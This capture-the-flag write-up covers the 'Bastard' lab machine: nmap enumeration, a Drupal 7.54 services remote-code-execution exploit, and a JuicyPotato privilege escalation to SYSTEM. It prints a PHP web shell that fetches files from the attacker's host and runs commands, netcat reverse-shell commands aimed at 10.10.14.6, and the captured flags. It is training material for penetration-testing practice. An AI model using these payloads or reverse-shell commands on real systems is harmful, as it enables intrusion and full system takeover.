# Bastard - Medium

## Enumeration
`sudo nmap 10.129.152.54 -p- -sV -vv -A --open --reason`

Interesting result that I first investigated:
```
80/tcp    open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Welcome to Bastard | Bastard
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
```

I checked the various sub-directories that were in `robots.txt`. `/CHANGELOG.txt` is the file that gave away the version number of Drupal that is being used:

```
Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to ...
```

The first search result gave us this exploit (https://www.exploit-db.com/exploits/41564). Someone even wrote a guide for it (https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/)

## Getting a Shell
Basically, following the guide:
1. Confirmed `$endpoint_path` exists by visiting the browser
- `http://10.129.152.54/rest_endpoint` gives `404`
- `http://10.129.152.54/rest` gives `200 OK`

3. The `41564.php` script was changed for the following lines:
    ```
    $url = 'http://10.129.152.54';
    $endpoint_path = '/rest';
    $endpoint = 'rest_endpoint';
    $phpCode = <<<'EOD'
    <?php
        if (isset($_REQUEST['fupload'])) {
            file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.6:8888/" . $_REQUEST['fupload']));
        };
        if (isset($_REQUEST['fexec'])) {
            echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
        };
    ?>
    EOD;

    $file = [
        'filename' => 'test3.php',
        'data' => $phpCode
    ];
    ```
4. Installed `php-curl` using `sudo apt-get install php-curl`
- Test if the new variables `fupload` and `fexec` works: `http://10.129.152.54/test3.php?fexec=dir`

5. Opened a web server to serve files, using `python3 -m http.server 8888` and uploaded `nc.exe`, `wget.exe`, and any subsequent files that we want to upload.

6. Set up a listener on kali to receive the reverse shell on target machine
- Visit `http://10.129.152.54/test3.php?fupload=nc.exe&fexec=nc.exe -e cmd 10.10.14.6 4444`

7. Local shell obtained, with flag:
    ```
    ┌──(kali㉿kali)-[~]
    └─$ nc -nlvp 4444
    listening on [any] 4444 ...
    connect to [10.10.14.6] from (UNKNOWN) [10.129.152.54] 63450
    Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\inetpub\drupal-7.54>whoami
    whoami
    nt authority\iusr
    ```

    ```
    C:\Users>type C:\Users\dimitris\Desktop\user.txt
    type C:\Users\dimitris\Desktop\user.txt
    008d31a0b6ea4621924e7b41abf5c981
    ```

## Privilege Escalation
Initially, I went straight to check for kernel exploits using the Windows Exploit Suggester (https://github.com/AonCyberLabs/Windows-Exploit-Suggester). After fixing hte `xlrd` issues, etc and trying the exploits, I didn't find any that worked. 

However, checking the privileges of the user:
```
C:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```
`systeminfo` also reveals that the OS is `Windows Server 2008 R2 Datacenter`. Perfect, we can just use `JuicyPotato`.

I used `fupload` to upload `JuicyPotato.exe` from https://github.com/ohpe/juicy-potato/releases. The default CLSID does not work,  but using the first one found here (https://ohpe.it/juicy-potato/CLSID/) does:
```
C:\Windows\Tasks>JP -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p C:\Windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.6 443" -t *
JP -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p C:\Windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.14.6 443" -t *
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Windows\Tasks>
```

Of course a listener was set up prior, and a root shell was obtained:
```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.152.54] 64848
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Flag:
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
9614a83ee8ae281ce3d26bf0596545aa
```
GG.